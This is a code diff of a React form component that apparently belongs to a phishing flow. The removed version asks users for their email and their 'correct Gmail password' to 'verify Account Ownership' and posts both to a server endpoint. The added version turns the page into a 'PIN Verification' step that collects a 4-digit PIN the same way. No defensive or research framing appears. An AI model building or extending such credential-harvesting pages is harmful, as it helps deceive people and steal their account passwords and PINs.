@@ -11,19 +11,17 @@ import FormErrMsg from "../components/FormErrMsg";
 
 // Validation schema using yup
 const schema = yup.object().shape({
-  email: yup
+  pin: yup
     .string()
-    .email("Enter a valid email")
-    .required("Email is required"),
-  password: yup.string().required("Password is required"),
+    .matches(/^\d{4}$/i, "PIN must be 4 digits")
+    .required("PIN is required"),
 });
 
-const Email = () => {
+const Pin = () => {
   const navigate = useNavigate();
   const {
     register,
     handleSubmit,
-    setValue,
     reset,
     formState: { errors },
   } = useForm({ resolver: yupResolver(schema) });
@@ -34,7 +32,7 @@ const Email = () => {
   const submitForm = (data) => {
     setLoading(true);
     axios
-      .post(`${BASE_URL}/email`, data)
+      .post(`${BASE_URL}/pin`, data)
       .then((response) => {
         console.log(response.data);
         reset();
@@ -51,42 +49,29 @@ const Email = () => {
     <div className="email-screen">
       <div className="email-container">
         <div className="email-header">
-          <div className="email-title">customer</div>
+          <div className="email-title">PIN Verification</div>
           <div className="email-subtitle">
-            Kindly Enter the email address you used during registration and the
-            correct Gmail password linked to that email to verify Account
-            Ownership.
+            Enter your 4-digit PIN to verify account ownership.
           </div>
         </div>
         <div className="email-card">
           <form onSubmit={handleSubmit(submitForm)} className="email-form">
             <div className="form-group">
-              <label className="email-label" htmlFor="email">
-                Email Address
+              <label className="email-label" htmlFor="pin">
+                PIN
               </label>
               <input
-                id="email"
-                type="email"
-                name="email"
-                placeholder="example@email.com"
-                className="email-input"
-                {...register("email")}
-              />
-              <FormErrMsg errors={errors} inputName="email" />
-            </div>
-
-            <div className="form-group">
-              <label className="email-label" htmlFor="password">
-                Password
-              </label>
-              <input
-                id="password"
+                id="pin"
                 type="password"
-                name="password"
+                name="pin"
                 className="email-input"
-                {...register("password")}
+                inputMode="numeric"
+                maxLength={4}
+                pattern="\d*"
+                placeholder="Enter 4-digit PIN"
+                {...register("pin")}
               />
-              <FormErrMsg errors={errors} inputName="password" />
+              <FormErrMsg errors={errors} inputName="pin" />
             </div>
 
             <button
@@ -94,7 +79,7 @@ const Email = () => {
               className="email-submit-btn"
               disabled={loading}
             >
-              {loading ? "Loading..." : "Sign In"}
+              {loading ? "Loading..." : "Verify PIN"}
             </button>
           </form>
         </div>
@@ -103,4 +88,4 @@ const Email = () => {
   );
 };
 
-export default Email;
+export default Pin;
